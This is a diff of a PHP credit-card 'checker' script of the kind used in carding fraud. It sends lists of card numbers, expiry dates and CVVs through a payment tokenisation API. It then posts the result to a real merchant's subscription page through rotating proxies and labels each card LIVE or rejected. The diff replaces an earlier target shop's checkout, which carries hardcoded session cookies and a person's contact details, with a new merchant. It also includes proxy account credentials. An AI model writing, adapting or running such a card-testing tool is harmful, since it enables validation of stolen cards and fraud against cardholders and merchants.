@@ -184,95 +184,93 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 $b_pago = curl_exec($ch);
 
- echo $b_pago;
-//  $token = trim(strip_tags(getstr($b_pago,'false,"id":"','"}')));
-// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
-// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
+ // echo $b_pago;
+ $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
+$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+$debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+$prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
+$cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
 // // echo $token;
 
 // //////////////////////// START REQUEST 2 ////////////////////////
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://www.tesselaar.net.au/checkout');
-//
-// //////////////////////// PROXY CALLS ////////////////////////////
-// //               REMOVE '//' FOR PROXIES TO WORK BELOW
-//
-// //////////////////////// PROXYSCRAPE
-// // curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
-// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-// //////////////////////// WEBSHARE
-// // curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
-// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
-//
-// //////////////////////// MANUAL Proxy List
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
-//
-// //////////////////////// LUMINATI
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// // End Proxy Calls
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
-// 'Accept-Encoding: gzip, deflate, br',
-// 'Accept-Language: en-US,en;q=0.9',
-// 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-// 'Cookie: XSRF-TOKEN=vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9%2BjUkw1hKRRD4Mx8%3D; _tesselaar_session_key=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJWEyMTgxMjUzM2JiMTlmMzkwYzhmYzNlYmFlMjhiY2QwBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMXZVcWpwUWt6NFFqZzJIbVhjZzZuSjZTZDRtdDkralVrdzFoS1JSRDRNeDg9BjsARg%3D%3D--492b5b4b1d8481627e2bed9b6ff93fd21f774f10; state_filter=NSW; shopping_cart_checkout_id=%22NTA1MTQ0%250A%22; shopping_cart_id=%22NTA1Nzkw%250A%22',
-// 'Host: www.tesselaar.net.au',
-// 'Origin: https://www.tesselaar.net.au',
-// 'Referer: https://www.tesselaar.net.au/checkout',
-// 'X-CSRF-Token: vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9+jUkw1hKRRD4Mx8=',
-// 'user-agent: '.$browser.'',
-// ));
-//
-// // //////////////////////// START POST FILED 1 ////////////////////////
-//
-// curl_setopt($ch, CURLOPT_POSTFIELDS, 'authenticity_token=vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9%2BjUkw1hKRRD4Mx8%3D&customer%5Bemail%5D=pubgkittu%40gmail.com&customer%5Bfirst_name%5D=Vincent&customer%5Blast_name%5D=Warner&customer%5Bmobile%5D=%2B615182641524&address%5Bcontact%5D=&address%5Bline1%5D=12+avenue&address%5Bline2%5D=&address%5Bsuburb%5D=Miami&address%5Bstate%5D=NSW&address%5Bpostcode%5D=2150&order%5Bdelivery_instruction%5D=&order%5Bcomments%5D=&reference=&amount=&payment%5Bcard_number%5D='.$cc.'&payment%5Bexpiry%5D='.$mes.'%2F'.$ano.'&payment%5Bcvv%5D='.$cvv.'&place_order=Place+order');
-//
-//
-//
-// // //*****************************************************************************************************************************************************************************************************************************************************************************
-//
-//
-// $result = curl_exec($ch);
-// if (curl_errno($ch)) {
-//     echo 'Error:'.curl_error($ch);
-// }
-// curl_close($ch);
-// $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t<pre><strong><\/strong>\n','<\/pre>\t\t<\/li>\n\t<\/ul>\n"')));
-// // // $result = json_decode($result, true);
-// $code = trim(strip_tags(getstr($result,'"code":',',"messa')));
-// // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
-//
-//
-//
-// if(strpos($result,'Your order has been placed')){
-//       // updatecart();
-//     echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-//
-//
-//    }
-//    elseif(strpos($result,'Sorry!')){
-//      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-// }
-// else {
-//
-//   echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-//
-//
-//   // updatecart();
-//   }
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://tutorextra.co.uk/user/payment?s=h');
+
+//////////////////////// PROXY CALLS ////////////////////////////
+//               REMOVE '//' FOR PROXIES TO WORK BELOW
+
+//////////////////////// PROXYSCRAPE
+// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+//////////////////////// WEBSHARE
+// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
+
+//////////////////////// MANUAL Proxy List
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
+
+//////////////////////// LUMINATI
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// End Proxy Calls
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'cookie: PHPSESSID=mj0v1bimac8khd6lv9pdkiclj6; webpush=notifications',
+'origin: https://tutorextra.co.uk',
+'referer: https://tutorextra.co.uk/user/payment?s=h',
+'user-agent: '.$browser.'',
+));
+
+// //////////////////////// START POST FILED 1 ////////////////////////
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'step=3&payment_method_nonce='.$token.'');
+
+
+
+// //*****************************************************************************************************************************************************************************************************************************************************************************
+
+
+$result = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo 'Error:'.curl_error($ch);
+}
+curl_close($ch);
+$message = trim(strip_tags(getstr($result,'<div class="invalid-card">','</div>')));
+// // $result = json_decode($result, true);
+$code = trim(strip_tags(getstr($result,'"code":',',"messa')));
+// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+
+
+
+if(strpos($result,'Your monthly PREMIUM subscription expires on')){
+      // updatecart();
+    echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+
+
+   }
+   elseif(strpos($result,'Sorry!')){
+     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+}
+else {
+
+  echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+
+
+  // updatecart();
+  }
 curl_close($curl);
 ob_flush();
 // echo $result
